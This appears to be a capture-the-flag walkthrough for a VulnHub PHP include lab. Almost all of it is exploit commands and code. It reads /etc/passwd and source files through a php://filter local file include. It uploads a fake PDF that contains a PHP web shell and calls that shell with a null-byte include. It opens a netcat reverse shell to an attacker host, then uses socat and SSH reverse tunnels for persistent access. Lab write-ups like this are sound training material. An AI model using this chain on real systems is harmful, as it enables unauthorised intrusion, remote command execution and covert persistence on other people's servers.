https://www.vulnhub.com/entry/pentester-lab-php-include-and-post-exploitation,79/


This exercice describes the exploitation of a local file include with limited access. Once code execution is gained, you will see some post exploitation tricks.



 
$ curl -s http://192.168.110.55/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd%00 | sed '/<div class="content">/,/<\/div>/!d' | sed 's/<\/\?[^>]\+>//g'| xargs | base64 -d


root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
mysql:x:101:103:MySQL Server,,,:/var/lib/mysql:/bin/false
sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
user:x:1000:1000:Debian Live user,,,:/home/user:/bin/bash



$ curl -s http://192.168.110.55/index.php?page=php://filter/convert.base64-encode/resource=classes/submission | sed '/<div class="content">/,/<\/div>/!d' | sed 's/<\/\?[^>]\+>//g'| xargs | base64 -d




```php

  function create(){
    if(isset($_FILES['pdf'])){
      $dir = 'uploads/';
      $file = $_FILES['pdf']['name'];
      if ((mime_content_type($_FILES['pdf']['tmp_name']) != "application/pdf")){ 
        DIE("File must be a PDF!!");
      }
      if (!preg_match('/\.pdf$/',$file)) {
        DIE("File must be a PDF!!");
      }
      else  { 
        if(!move_uploaded_file($_FILES['pdf']['tmp_name'], $dir . $file)) {
          die("Error during upload");
        }
      } 
      $sql = "INSERT INTO submissions (email,password,";
      $sql .= "title,description,bio, filename) VALUES ('";

      $title = mysql_real_escape_string($_POST["title"]);
      $file = $dir.mysql_real_escape_string( $file);
      $email = mysql_real_escape_string( $_POST["email"]);
      $password = mysql_real_escape_string( $_POST["password"]);
      $bio = mysql_real_escape_string( $_POST["bio"]);
      $description = mysql_real_escape_string( $_POST["description"]);

    
      $sql .= $email."','".$password."','".$title."','".$description."','";
      $sql .= $bio."','".$file;
      $sql.= "')";
      $result = mysql_query($sql);
      echo mysql_error(); 
    }

  }

```




```python
# submit form
# <form action="/index.php" method="POST" enctype="multipart/form-data">
# Email:<br>  <input type="text" name="email" size="72"><br>
# Password:<br> <input type="password" name="password" size="72"><br>
# Password (again):<br> <input type="password" name="password_again" size="72"><br>
# <br>

# Title:<br>  <input type="text" name="title" size="72"><br>
# Description:<br>
# <textarea name="description" cols="62" rows="6">  </textarea>
# Bio:<br>
# <textarea name="bio" cols="62" rows="6">  </textarea>

# PDF of your presentation:<br>
# <input type="file" name="pdf" size="61"><br> 
# <div align="center">
# <input type="reset" value="Cancel">
# <input type="submit" name="submit" value="Submit">
# </div>
# </form>

import requests
import string

session = requests.Session()
url = "http://192.168.110.55/index.php"

response = session.get(url)
cookies = session.cookies.get_dict()


data = {
    "email" : "test@pentest.com",
    "password" : "test123456",
    "password_again" : "test123456",
    "title" : "test",
    "description" : "test",
    "bio" : "test",
    "submit" : "Submit",
}


# files = {'pdf': open('test.pdf','rb')}
files = {'pdf': open('shell.pdf','rb')}

r = session.post(url, files=files, data=data, cookies=cookies)

print (r.text)

```


Fake PDF file

```bash

$ cat shell.pdf 
%PDF-1.5
<?php system(_GET["cmd"]); ?>

```


Exploit 

```bash
curl -s -G  'http://192.168.110.55/index.php?page=uploads/shell.pdf%00&cmd=ls%20-al' | sed '/<div class="content">/,/<\/div>/!d' | sed -r -e '1,2d' -e '$d' -e 's/^\s+//'

curl -s -G  'http://192.168.110.55/index.php?page=uploads/shell.pdf%00&cmd=nc%20192.168.110.1%204444%20-e%20/bin/sh'

```

Socat tunning


```bash
# attacker
sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr

# victim
while true; do socat TCP4:192.168.110.1:443 TCP4:127.0.0.1:22 2>&1 ; done

# attacker 
# ssh-genkey -P "" -f vulnerable
ssh www-data@localhost -p 2222  -i vulnerable

```


SSH tunning

```bash

# ssh-genkey -P "" -f kali
# append kali.pub to the ~/.ssh/authorized_keys
ssh -N -f -R 2222:127.0.0.1:22  -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null kali@192.168.110.1 -i kali 2>&1

```
